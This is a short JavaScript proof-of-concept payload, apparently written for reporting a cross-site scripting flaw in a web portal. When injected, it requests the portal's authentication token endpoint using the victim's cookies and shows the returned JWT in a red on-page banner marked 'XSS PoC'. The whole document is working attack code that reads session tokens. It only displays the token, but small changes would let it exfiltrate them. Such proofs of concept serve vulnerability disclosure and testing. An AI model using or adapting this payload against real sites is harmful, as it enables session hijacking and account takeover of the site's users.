fetch('/_services/auth/token', {
  method: 'POST',
  credentials: 'include'
})
.then(r => r.text())
.then(token => {
  var div = document.createElement('div');
  div.style = 'position:fixed;top:0;left:0;width:100%;background:#cc0000;color:#fff;z-index:99999;padding:20px;font-size:11px;font-family:monospace;word-wrap:break-word;max-height:60%;overflow:auto;';
  div.innerHTML = '<b>XSS PoC - Portal JWT Token</b><br><br>' + token;
  document.body.appendChild(div);
});